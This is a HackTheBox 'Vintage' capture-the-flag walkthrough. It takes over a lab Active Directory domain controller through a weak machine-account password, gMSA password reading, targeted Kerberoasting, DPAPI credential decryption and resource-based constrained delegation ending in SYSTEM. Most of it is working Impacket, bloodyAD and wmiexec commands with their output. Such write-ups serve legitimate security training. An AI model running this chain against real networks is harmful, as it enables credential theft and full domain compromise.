---
tags: [HTB, Vintage, Windows, ActiveDirectory, Kerberos, LDAP, SMB, gMSA, Kerberoasting, DPAPI, RBCD, SYSTEM, Hard]
platform: HackTheBox
os: Windows Server 2022 Standard x64
hostname: DC01
difficulty: Hard
ip: 10.129.231.205
status: Complete
---

# HTB: Vintage, Full Walkthrough

## The gist

Vintage is a hard Windows assumed-breach Active Directory machine. The supplied `P.Rosa` credentials authenticate through Kerberos, but NTLM is disabled. LDAP and BloodHound expose a pre-created computer account, a gMSA password-read path, and a delegated group relationship.

The pre-created `FS01$` computer account accepts its machine name, `fs01`, as its password. `FS01$` can read the managed password for `gMSA01$`. The gMSA has `GenericWrite` and `AddSelf` over `ServiceManagers`; that group controls `svc_sql`, so the account can enable `svc_sql` and add an SPN. A targeted Kerberoast recovers a password reused by `C.Neri`.

`C.Neri` has a credential stored in Windows Credential Manager. The associated DPAPI masterkey decrypts a password for `C.Neri_adm`. That account is already a member of `DelegatedAdmins`, and can add `FS01$` to the same group. `DelegatedAdmins` is present in DC01's `msDS-AllowedToActOnBehalfOfOtherIdentity` descriptor, so the computer account can request a delegated ticket and impersonate `L.Bianchi_adm`, a Domain Admin. Kerberos-aware WMI then creates a one-shot SYSTEM scheduled task for final proof.

The chain is:

```text
Supplied P.Rosa credentials
  -> Kerberos-only authentication; NTLM rejected
  -> pre-created FS01$ password = fs01
  -> FS01$ reads gMSA01$ managed password
  -> gMSA01$ GenericWrite/AddSelf over ServiceManagers
  -> enable svc_sql and set http/svc_sql.vintage.htb
  -> targeted Kerberoast -> svc_sql password
  -> password reuse -> C.Neri
  -> Credential Manager + DPAPI -> C.Neri_adm
  -> C.Neri_adm adds FS01$ to DelegatedAdmins
  -> group-based RBCD on DC01
  -> FS01$ S4U2Proxy impersonates L.Bianchi_adm
  -> Kerberos WMI -> one-shot SYSTEM task
```

> [!warning] Evidence boundary
> The source transcript and loot prove the completed chain, including the recovered gMSA hash, Kerberoast result, DPAPI credential, group membership, delegated ticket, WMI session, and private flags. The transcript contains failed exploratory commands as well as the successful route; this report labels those failures instead of presenting them as working techniques.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Difficulty | Hard |
| Operating system | Windows Server 2022 Standard x64 |
| Hostname | `DC01` |
| Target | `10.129.231.205` |
| Domain | `vintage.htb` |
| Open services | TCP 53 DNS, 88 Kerberos, 135 RPC, 389/636 LDAP, 445 SMB, 464 kpasswd, 593 RPC over HTTP, 3268/3269 Global Catalog, 5985 WinRM, 9389 AD Web Services |
| Initial access | Supplied `P.Rosa` credentials over Kerberos |
| User proof | `C.Neri` WinRM session and user flag |
| Privilege path | DPAPI recovery, delegated group membership, group-based RBCD, S4U2Proxy |
| SYSTEM proof | Kerberos-aware WMI and a one-shot SYSTEM scheduled task |

## Vulnerability summary

| # | Vulnerability or misconfiguration | Severity | Location |
|---|---|---|---|
| 1 | Pre-created computer account uses a predictable machine-name password | High | `FS01$` |
| 2 | Domain Computers can read a gMSA managed password | High | `gMSA01$` |
| 3 | gMSA has `GenericWrite`/`AddSelf` over a service-management group | High | `ServiceManagers` |
| 4 | Service-management group controls a disabled service account | High | `svc_sql` |
| 5 | Kerberoastable SPN and password reuse | High | `svc_sql` / `C.Neri` |
| 6 | DPAPI-protected Credential Manager secret is recoverable with the user's password | High | `C.Neri` profile |
| 7 | `DelegatedAdmins` is trusted for RBCD on the domain controller and is writable by a recovered admin account | Critical | `DC01$` / `DelegatedAdmins` |

## Evidence and loot

The source loot and transcript were read from:

`/home/kali/Platforms/HackTheBox/Vintage/`

| Evidence | Source location |
|---|---|
| Raw terminal transcript | `Vintage.log` |
| Variables and final recovered values | `.env` |
| Full TCP scan | `nmap/tcp-all.nmap` and `nmap/tcp-all.*` |
| Service scan | `nmap/services.nmap` and `nmap/services.*` |
| LDAP RootDSE | `loot/ldap-rootdse.txt` |
| LDAP user and group enumeration | `loot/ldap-users.txt` |
| Raw gMSA managed password | `loot/gmsa-raw.txt` |
| SPN target list and Kerberoast ticket | `loot/spn-targets.txt`, `loot/kerberoast.hashes` |
| DPAPI credential and masterkeys | `loot/cred.blob`, `loot/masterkey1`, `loot/masterkey2`, and source transcript |
| BloodHound collection | `loot/bh-data/` and `loot/bloodhound-*.zip` |
| Flags | `loot/flags.txt` |


## Variables

Use the helper variables in a clean run. Keep the source platform workspace and any autonomous temporary workspace distinct. The source transcript used `/home/kali/Platforms/HackTheBox/Vintage`; a clean reproduction should still use a temporary folder for local working files.

```bash
boxset BoxName Vintage
boxset BoxIP 10.129.231.205
boxset LocalIP $LocalIP
boxset FQDN dc01.vintage.htb
boxset Domain vintage.htb
boxset DCip 10.129.231.205
boxset Username P.Rosa
boxset Password Rosaisbest123
boxset Port 4444
boxset TransferPort 8000
boxset WebPort 5985
```

The later stages use separate variables so the assumed-breach credential is not confused with recovered secrets:

```bash
boxset Username2 C.Neri
boxset Username3 C.Neri_adm
```

## 1. Initialise the session and preserve evidence

Start the box workspace and transcript. In a clean run, put all local output under the temporary box directory; the source path below is only the evidence location for this completed run.

```bash
boxstart Vintage 10.129.231.205 htb
htblog
mkdir -p "$BoxDir"/{nmap,loot,bh-data,notes}
```

> [!tip] 💡 Evidence habit
> Save scans, LDAP output, hashes, tickets, and screenshots at the moment they prove a decision. The command that creates a ticket is not the same evidence as the command that successfully uses it.

## 2. Full TCP enumeration

The all-port scan found the standard domain-controller service set plus dynamic RPC ports.

```bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 \
  --max-retries 2 -T4 \
  -oA "$BoxDir/nmap/tcp-all" "$BoxIP"
```

Observed output:

```text
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp, 49668/tcp, 49676/tcp, 49687/tcp open unknown
56129/tcp, 61682/tcp, 64558/tcp open unknown
```

[Screenshot: vintage-1.nmap-allports.png](obsidian://open?vault=main-vault&file=vintage-1.nmap-allports.png)
> 📸 Screenshot: Full TCP scan with the domain-controller port set visible.

> [!abstract] 🧠 What matters
> TCP/88, LDAP, SMB, Global Catalog, and WinRM form an AD branch. The absence of a web service means the assumed-breach credential should be validated against Kerberos, LDAP, SMB, and WinRM rather than sent to a generic web scanner.

## 3. Service and version enumeration

Run a focused scan against the discovered domain-controller ports.

```bash
sudo nmap -Pn -n -sC -sV --version-all \
  -p53,88,135,389,445,464,593,636,3268,3269,5985,9389 \
  -oA "$BoxDir/nmap/services" "$BoxIP"
```

Observed results:

```text
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI 2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows
SMB signing enabled and required
```

[Screenshot: vintage-2.nmap-services.png](obsidian://open?vault=main-vault&file=vintage-2.nmap-services.png)
> 📸 Screenshot: Focused service scan and SMB signing result.

> [!hint] 💡 Branch decision
> The `Domain:` field in the LDAP banner and the `Host:` field identify the naming context and DC hostname. Record both before using Kerberos tools; Kerberos is name-sensitive even when LDAP and SMB can be reached by IP.

## 4. Configure local name resolution and Kerberos

Add the DC and domain names locally, while preserving the original hosts file for clean-down.

```bash
sudo cp -a /etc/hosts "$BoxDir/notes/hosts.before"
printf '%s\n' '10.129.231.205 dc01.vintage.htb dc01 vintage.htb' \
  | sudo tee -a /etc/hosts
```

Create a minimal Kerberos configuration in the temporary notes directory:

```ini
[libdefaults]
    default_realm = VINTAGE.HTB
    dns_lookup_kdc = false
    dns_lookup_realm = false
    rdns = false

[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
    }

[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB
```

Use it explicitly:

```bash
export KRB5_CONFIG="$BoxDir/notes/krb5.conf"
```

## 5. Validate the assumed-breach credential and identify the NTLM boundary

The supplied account was `P.Rosa / Rosaisbest123`. First test the credential through Kerberos and save the TGT in the loot directory.

```bash
cd "$BoxDir/loot"
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
  getTGT.py 'vintage.htb/P.Rosa:Rosaisbest123' \
  -dc-ip "$BoxIP"
```

The useful result was:

```text
[*] Saving ticket in P.Rosa.ccache
```

Validate that ticket against SMB:

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/P.Rosa.ccache" \
  nxc smb dc01.vintage.htb -d vintage.htb -k \
  --use-kcache --kdcHost "$BoxIP"
```

The direct NTLM-style test failed with `STATUS_NOT_SUPPORTED`; the Kerberos cache test succeeded. The important conclusion is not that the password is bad. NTLM authentication is disabled, so subsequent tools must use Kerberos tickets, FQDNs, and explicit caches.

[Screenshot: vintage-3.kerberos-auth.png](obsidian://open?vault=main-vault&file=vintage-3.kerberos-auth.png)
> 📸 Screenshot: Kerberos succeeds while the NTLM route is rejected.

> [!warning] 💡 NTLM-disabled gotcha
> Do not keep retrying `-u/-p` NetExec, SMB, or WinRM commands after `STATUS_NOT_SUPPORTED`. Obtain a TGT with `getTGT.py`, set `KRB5CCNAME`, use the FQDN, and select a Kerberos-aware client. The installed NetExec WinRM module in this run remained NTLM-oriented; `evil-winrm` or Impacket was the reliable Kerberos route.

## 6. Enumerate LDAP and collect BloodHound data

Read the RootDSE first. This confirms the naming context and DC hostname before broader enumeration.

```bash
ldapsearch -x -H ldap://"$BoxIP" \
  -s base -b '' \
  namingContexts defaultNamingContext dnsHostName \
  | tee "$BoxDir/loot/ldap-rootdse.txt"
```

The important values were:

```text
defaultNamingContext: DC=vintage,DC=htb
dnsHostName: dc01.vintage.htb
```

Use the Kerberos ticket for BloodHound collection:

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/P.Rosa.ccache" \
  bloodhound-python -u P.Rosa -d vintage.htb -k -no-pass \
  --auth-method kerberos -ns "$BoxIP" -dc dc01.vintage.htb \
  -c All --zip -op "$BoxDir/loot/bh-data"
```

The collection contained users, groups, computers, OUs, and ACL relationships. Manual LDAP output was retained as a readable fallback:

```bash
ldapsearch -Y GSSAPI -H ldap://dc01.vintage.htb \
  -b 'DC=vintage,DC=htb' \
  '(objectClass=user)' sAMAccountName userAccountControl memberOf \
  | tee "$BoxDir/loot/ldap-users.txt"
```

[Screenshot: vintage-4.ldap-users.png](obsidian://open?vault=main-vault&file=vintage-4.ldap-users.png)
> 📸 Screenshot: LDAP user and group enumeration.

[Screenshot: vintage-5.bloodhound-collection.png](obsidian://open?vault=main-vault&file=vintage-5.bloodhound-collection.png)
> 📸 Screenshot: BloodHound collection output.

> [!abstract] 🧠 What to focus on
> Search the graph for `ReadGMSAPassword`, `GenericWrite`, `AddSelf`, `member`, `AllowedToAct`, and disabled service accounts. A path that ends at a group is not complete until the group membership and the target object's current state are manually verified.

## 7. Use the pre-created `FS01$` account to read the gMSA password

BloodHound and the source loot showed that `FS01$` was a pre-created computer account. Its password was the lowercase machine name, `fs01`.

```bash
cd "$BoxDir/loot"
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
  getTGT.py 'vintage.htb/FS01$:fs01' -dc-ip "$BoxIP"
```

Observed result:

```text
[*] Saving ticket in FS01$.ccache
```

Use the machine ticket to read the raw managed password for `gMSA01$`:

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/FS01$.ccache" \
  bloodyAD -d vintage.htb -u 'FS01$' \
  -k ccache="$BoxDir/loot/FS01$.ccache" kdc="$BoxIP" \
  -H dc01.vintage.htb -i "$BoxIP" \
  get object 'gMSA01$' --attr msDS-ManagedPassword --raw \
  | tee "$BoxDir/loot/gmsa-raw.txt"
```

The raw output contained the gMSA managed-password structure and the NT hash used later for Kerberos authentication. The source `.env` records the recovered NT hash privately.

[Screenshot: vintage-7.fs01-tgt.png](obsidian://open?vault=main-vault&file=vintage-7.fs01-tgt.png)
> 📸 Screenshot: TGT for the pre-created computer account.

> [!warning] 💡 Machine-account syntax
> Preserve the trailing `$` in `FS01$` and `gMSA01$`. Quote the identity when using a shell variable or a command line that interprets `$` as variable syntax.

## 8. Follow the gMSA ACL to `ServiceManagers`

The gMSA's rights were over the group, not directly over every service account. First add `gMSA01$` to `ServiceManagers`, then verify the group member list.

```bash
export GMSA_HASH='[private value from loot/gmsa-raw.txt]'
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
  getTGT.py 'vintage.htb/gMSA01$' \
  -hashes ":$GMSA_HASH" -dc-ip "$BoxIP"
```

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/gMSA01$.ccache" \
  bloodyAD -d vintage.htb -u 'gMSA01$' \
  -k ccache="$BoxDir/loot/gMSA01$.ccache" kdc="$BoxIP" \
  -H dc01.vintage.htb -i "$BoxIP" \
  add groupMember ServiceManagers 'gMSA01$'

KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/gMSA01$.ccache" \
  bloodyAD -d vintage.htb -u 'gMSA01$' \
  -k ccache="$BoxDir/loot/gMSA01$.ccache" kdc="$BoxIP" \
  -H dc01.vintage.htb -i "$BoxIP" \
  get object ServiceManagers --attr member
```

The successful verification showed `gMSA01$` alongside the original service managers. Renew the gMSA ticket after the group change; the old ticket does not automatically gain the new authorization.

```bash
rm -f "$BoxDir/loot/gMSA01$.ccache"
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
  getTGT.py 'vintage.htb/gMSA01$' \
  -hashes ":$GMSA_HASH" -dc-ip "$BoxIP"
```

[Screenshot: vintage-5.acl-chain.png](obsidian://open?vault=main-vault&file=vintage-5.acl-chain.png)
> 📸 Screenshot: gMSA-to-ServiceManagers ACL chain.

> [!warning] 💡 Ticket renewal gotcha
> Directory membership changes affect authorization at the KDC and service layer, not retroactively inside every existing ticket. If a newly allowed LDAP write returns `insufficientAccessRights`, verify membership, renew the TGT, and retry once.

## 9. Enable `svc_sql`, set an SPN, and request a targeted service ticket

`svc_sql` was disabled but controlled through `ServiceManagers`. Its disabled UAC value was restored during clean-down; the successful run temporarily set UAC to 512 and added an SPN.

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/gMSA01$.ccache" \
  bloodyAD -d vintage.htb -u 'gMSA01$' \
  -k ccache="$BoxDir/loot/gMSA01$.ccache" kdc="$BoxIP" \
  -H dc01.vintage.htb -i "$BoxIP" \
  set object svc_sql userAccountControl -v 512

KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/gMSA01$.ccache" \
  bloodyAD -d vintage.htb -u 'gMSA01$' \
  -k ccache="$BoxDir/loot/gMSA01$.ccache" kdc="$BoxIP" \
  -H dc01.vintage.htb -i "$BoxIP" \
  set object svc_sql servicePrincipalName \
  -v 'http/svc_sql.vintage.htb'
```

The first automatic `GetUserSPNs.py -request` path failed because the installed Impacket version attempted NTLM/name-based enumeration. Since LDAP and BloodHound already identified the exact target, a one-name target file was the reliable workaround:

```bash
printf '%s\n' svc_sql > "$BoxDir/loot/spn-targets.txt"

KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/gMSA01$.ccache" \
  GetUserSPNs.py 'vintage.htb/gMSA01$' -k -no-pass \
  -dc-ip "$BoxIP" \
  -usersfile "$BoxDir/loot/spn-targets.txt" \
  -outputfile "$BoxDir/loot/kerberoast.hashes"
```

The captured `$krb5tgs$23$` ticket was cracked offline:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt \
  "$BoxDir/loot/kerberoast.hashes"
john --show "$BoxDir/loot/kerberoast.hashes"
```

[Screenshot: vintage-8.kerboroasty-hash.png](obsidian://open?vault=main-vault&file=vintage-8.kerboroasty-hash.png)
> 📸 Screenshot: Captured `svc_sql` Kerberos service ticket.

[Screenshot: vintage-9.kerboroast-cracked.png](obsidian://open?vault=main-vault&file=vintage-9.kerboroast-cracked.png)
> 📸 Screenshot: Offline crack result, retained privately in the Credentials section.

> [!abstract] 🧠 What this proves
> The SPN made the service account requestable through Kerberos. The ticket is not the account password; the crack result becomes useful only after it is validated against the next account and service.

## 10. Validate password reuse and open the Windows foothold

The cracked `svc_sql` password was reused by `C.Neri`. Obtain a TGT for the user and validate the cache.

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
  getTGT.py 'vintage.htb/C.Neri:[private svc_sql password]' \
  -dc-ip "$BoxIP"

KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/C.Neri.ccache" \
  nxc smb dc01.vintage.htb -d vintage.htb -k \
  --use-kcache --kdcHost "$BoxIP"
```

The installed NetExec WinRM module did not provide a working Kerberos path in this environment. Direct Ruby `evil-winrm` also required a temporary compatibility edit (`EstandardError` to `StandardError`) in the local copy. After that fix, the Kerberos session opened as `vintage\c.neri` on `dc01`.

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
  evil-winrm -i dc01.vintage.htb -r VINTAGE.HTB \
  -u C.Neri -p '[private reused password]'
```

Session proof:

```powershell
whoami
hostname
whoami /groups
whoami /priv
```

Observed identity:

```text
vintage\c.neri
DC01
```

> [!warning] 💡 Tooling gotcha
> A working Kerberos TGT does not guarantee every installed remote client can consume it. Separate “credential is valid” from “this client supports Kerberos.” Use the FQDN, explicit realm/cache settings, and switch to Impacket or a patched local Evil-WinRM copy when the module itself is the failure point.

## 11. Collect the user proof and inspect Credential Manager

The `C.Neri` session had access to the user desktop and the standard Windows credential locations.

```powershell
Get-ChildItem -Force C:\Users\C.Neri\Desktop
Get-ChildItem -Force C:\Users\C.Neri\AppData\Local\Microsoft\Credentials
Get-ChildItem -Force C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials
Get-ChildItem -Force C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\
cmdkey /list
```

The profile contained these relevant files:

```text
C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6
S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
```

Evil-WinRM's download function failed with `uninitialized constant WinRM::FS::FileManager::EstandardError`. The files were therefore copied or read as PowerShell Base64 and reconstructed locally. This is a transfer workaround, not a new privilege technique.

[Screenshot: vintage-10.dpapi-cred-blob.png](obsidian://open?vault=main-vault&file=vintage-10.dpapi-cred-blob.png)
> 📸 Screenshot: Credential Manager blob collection.

## 12. Decrypt the DPAPI masterkey and recover `C.Neri_adm`

Use the user's SID, the reused `C.Neri` password, and the collected masterkey files. The source run showed that `99cf41a3-a552-4cf7-a8d7-aca2d6f7339b` was the useful masterkey for the credential blobs.

```bash
SID='S-1-5-21-4024337825-2033394866-2055507597-1115'

KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
  dpapi.py masterkey -file "$BoxDir/loot/masterkey1" \
  -sid "$SID" -password '[private C.Neri password]'

KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
  dpapi.py masterkey -file "$BoxDir/loot/masterkey2" \
  -sid "$SID" -password '[private C.Neri password]'
```

Use the decrypted key with the credential blob. Keep the `0x` prefix returned by `dpapi.py`; omitting it can make a valid key appear invalid.

```bash
dpapi.py credential \
  -file "$BoxDir/loot/cred.blob" \
  -key '0x[decrypted masterkey from masterkey2]'
```

The decisive output was:

```text
Target   : LegacyGeneric:target=admin_acc
Username : vintage\c.neri_adm
Unknown  : [private recovered password]
```

[Screenshot: vintage-11.dpapi-masterkey1.png](obsidian://open?vault=main-vault&file=vintage-11.dpapi-masterkey1.png)
> 📸 Screenshot: Masterkey decryption attempt.

[Screenshot: vintage-12.decrypted-masterkey2.png](obsidian://open?vault=main-vault&file=vintage-12.decrypted-masterkey2.png)
> 📸 Screenshot: Successful masterkey decryption.

[Screenshot: vintage-13.dpapi-decrypted.png](obsidian://open?vault=main-vault&file=vintage-13.dpapi-decrypted.png)
> 📸 Screenshot: Recovered `C.Neri_adm` credential.

> [!warning] 💡 DPAPI mapping gotcha
> A profile can contain multiple masterkeys and multiple credential blobs. A padding error does not automatically mean the password is wrong. Try the other masterkey, keep the SID exact, preserve the `0x` key prefix, and match the credential blob to the key that decrypts it.

## 13. Add `FS01$` to the delegated group and verify the token

The recovered `C.Neri_adm` credential authenticated through Kerberos. LDAP showed that `C.Neri_adm` was already a member of `DelegatedAdmins`, while `L.Bianchi_adm` was a Domain Admin.

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
  getTGT.py 'vintage.htb/C.Neri_adm:[private recovered password]' \
  -dc-ip "$BoxIP"

KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/c.neri_adm.ccache" \
  bloodyAD -d vintage.htb -u c.neri_adm \
  -k ccache="$BoxDir/loot/c.neri_adm.ccache" kdc="$BoxIP" \
  -H dc01.vintage.htb -i "$BoxIP" \
  add groupMember DelegatedAdmins 'FS01$'
```

The first attempt was not enough to trust the stale machine ticket. Verify both the group member list and the computer account's `tokenGroups`:

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/c.neri_adm.ccache" \
  bloodyAD -d vintage.htb -u c.neri_adm \
  -k ccache="$BoxDir/loot/c.neri_adm.ccache" kdc="$BoxIP" \
  -H dc01.vintage.htb -i "$BoxIP" \
  get object DelegatedAdmins --attr member

ldapsearch -Y GSSAPI -H ldap://dc01.vintage.htb \
  -b 'CN=FS01,CN=Computers,DC=vintage,DC=htb' -s base \
  tokenGroups memberOf
```

The verification showed `FS01$` in `DelegatedAdmins` and the group's SID in the machine account token groups. Renew the machine TGT using its pre-created password:

```bash
rm -f "$BoxDir/loot/FS01$.ccache"
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
  getTGT.py 'vintage.htb/FS01$:fs01' -dc-ip "$BoxIP"
```

[Screenshot: vintage-6.rbcd-chain.png](obsidian://open?vault=main-vault&file=vintage-6.rbcd-chain.png)
> 📸 Screenshot: Group-based RBCD relationship and authorization chain.

> [!warning] 💡 Group-based RBCD nuance
> `C.Neri_adm` being in `DelegatedAdmins` is not itself the S4U source. The usable source account is the computer account `FS01$`, because it has an SPN and a machine secret. `C.Neri_adm` uses its group-control right to add `FS01$` to the group that DC01 already trusts.

## 14. Request the delegated ticket and use Kerberos WMI

Request a service ticket to DC01 while impersonating `L.Bianchi_adm`, whose Domain Admin membership was confirmed during LDAP/BloodHound review.

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/FS01$.ccache" \
  getST.py -spn 'cifs/dc01.vintage.htb' \
  -impersonate L.Bianchi_adm -k -no-pass \
  -dc-ip "$BoxIP" 'vintage.htb/FS01$'
```

The successful output was:

```text
[*] Impersonating L.Bianchi_adm
[*] Saving ticket in L.Bianchi_adm.ccache
```

The first ticket attempts returned `KDC_ERR_BADOPTION` because the directory membership and ticket state had not both refreshed. The successful route verified the group membership, renewed `FS01$`'s TGT, then requested the ticket again.

Validate the delegated cache over SMB, then use WMI for a command proof:

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/L.Bianchi_adm.ccache" \
  nxc smb dc01.vintage.htb -d vintage.htb -k \
  --use-kcache --kdcHost "$BoxIP"

KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/L.Bianchi_adm.ccache" \
  wmiexec.py -k -no-pass \
  'vintage.htb/L.Bianchi_adm@dc01.vintage.htb' 'whoami'
```

The WMI identity was:

```text
vintage\l.bianchi_adm
```

The built-in `Administrator` impersonation path returned `STATUS_LOGON_TYPE_NOT_GRANTED` over the tested SMB/WMI route. `L.Bianchi_adm` was already a Domain Admin and provided the cleaner, validated proof.

[Screenshot: vintage-14.rbcd-admin-ticket.png](obsidian://open?vault=main-vault&file=vintage-14.rbcd-admin-ticket.png)
> 📸 Screenshot: S4U2Self/S4U2Proxy ticket creation.

[Screenshot: vintage-15.wmiexec-lbianchi.png](obsidian://open?vault=main-vault&file=vintage-15.wmiexec-lbianchi.png)
> 📸 Screenshot: Kerberos WMI command execution as `L.Bianchi_adm`.

> [!abstract] 🧠 What this proves
> The delegated cache is not merely a Kerberos login. The S4U flow successfully turned the group relationship into service access on DC01 as a privileged user. Use the service SPN that matches the client: `cifs/` for SMB and WMI/Impacket access through the host's administrative services.

## 15. Prove SYSTEM with a reversible one-shot task

The WMI session was used to create a one-shot scheduled task running as SYSTEM. The task copied the root proof to a temporary file, then was removed.

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/L.Bianchi_adm.ccache" \
  wmiexec.py -k -no-pass dc01.vintage.htb \
  'cmd.exe /c schtasks /create /tn RootFlag /sc once /st 00:00 /ru SYSTEM /tr "cmd.exe /c type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\Windows\\Temp\\rf.txt" /f && schtasks /run /tn RootFlag'

sleep 3

KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/L.Bianchi_adm.ccache" \
  wmiexec.py -k -no-pass dc01.vintage.htb \
  'cmd.exe /c type C:\\Windows\\Temp\\rf.txt'
```

The command returned `SUCCESS: Attempted to run the scheduled task "RootFlag"` and the private source loot captured the resulting proof. Remove the task and temporary file immediately:

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/L.Bianchi_adm.ccache" \
  wmiexec.py -k -no-pass dc01.vintage.htb \
  'cmd.exe /c schtasks /delete /tn RootFlag /f && del C:\\Windows\\Temp\\rf.txt'
```

> [!warning] 💡 Proof versus escalation
> The scheduled task was a controlled SYSTEM proof after Domain Admin-equivalent WMI access. It was not the original privilege-escalation primitive. Keep the report focused on the RBCD path that produced the privileged ticket, and record the task only as the final proof/collection mechanism.

## RUNBOOK V2 Stages Used

| Stage | How Vintage used it |
|---|---|
| [[OSCP/RUNBOOK V2/Start Here\|Start Here]] | Full TCP scan and evidence workspace |
| [[OSCP/RUNBOOK V2/AD - Service Scan\|AD - Service Scan]] | Domain, DC hostname, Kerberos, LDAP, SMB, Global Catalog, WinRM, and clock evidence |
| [[OSCP/RUNBOOK V2/AD - Clock Sync\|AD - Clock Sync]] | Kerberos name/time prerequisites; no clock correction was needed in the captured run |
| [[OSCP/RUNBOOK V2/AD - Credential Validation\|AD - Credential Validation]] | Kerberos TGT validation and NTLM-disabled boundary |
| [[OSCP/RUNBOOK V2/AD - BloodHound\|AD - BloodHound]] | gMSA read, group ACL, service-account control, and `AllowedToAct` relationship mapping |
| [[OSCP/RUNBOOK V2/AD - Group Triage\|AD - Group Triage]] | `ServiceManagers` and `DelegatedAdmins` membership verification |
| [[OSCP/RUNBOOK V2/AD - Kerberoasting\|AD - Kerberoasting]] | SPN creation, targeted TGS request, and offline crack |
| [[OSCP/RUNBOOK V2/AD - WinRM Foothold\|AD - WinRM Foothold]] | Kerberos-aware `C.Neri` foothold and identity proof |
| [[OSCP/RUNBOOK V2/AD - Local Credential Search\|AD - Local Credential Search]] | Credential Manager, DPAPI masterkey, and stored admin credential recovery |
| [[OSCP/RUNBOOK V2/AD - Resource-Based Constrained Delegation\|AD - Resource-Based Constrained Delegation]] | Group-based RBCD, S4U2Proxy, and delegated service access |
| [[OSCP/RUNBOOK V2/AD - Clean Down\|AD - Clean Down]] | Remove temporary group members/SPN/UAC changes, tasks, files, and local host entries |

## Decision points and gotchas

| Observation | Decision |
|---|---|
| LDAP advertised `vintage.htb`, DC01, and Kerberos | Configure `/etc/hosts` and `krb5.conf` before ticket work |
| NTLM returned `STATUS_NOT_SUPPORTED` | Stop password-based NTLM retries; use Kerberos TGTs and FQDNs |
| `FS01$` was pre-created and had predictable machine password | Request a machine TGT with `fs01` |
| `FS01$` could read `gMSA01$` managed password | Parse the raw gMSA value and use the NT hash for a TGT |
| gMSA had `GenericWrite`/`AddSelf` over `ServiceManagers` | Add the gMSA to the group, verify it, and renew its TGT |
| `svc_sql` was disabled | Temporarily set UAC to 512 before adding the SPN; restore 66050 during cleanup |
| Automatic `GetUserSPNs.py` enumeration failed | Supply the exact `svc_sql` target with `-usersfile` |
| Kerberoast crack produced a password reused by `C.Neri` | Validate with a new TGT and open the foothold |
| Evil-WinRM download failed with `EstandardError` | Use PowerShell Base64 markers and reconstruct the DPAPI files locally |
| DPAPI credential decryption gave padding errors | Try the other masterkey, preserve the SID, and retain the `0x` key prefix |
| `C.Neri_adm` had no usable SPN for direct S4U | Use the SPN-bearing `FS01$` as the delegation source |
| `getST.py` returned `KDC_ERR_BADOPTION` | Verify `FS01$` is in `DelegatedAdmins`, check `tokenGroups`, and renew its TGT |
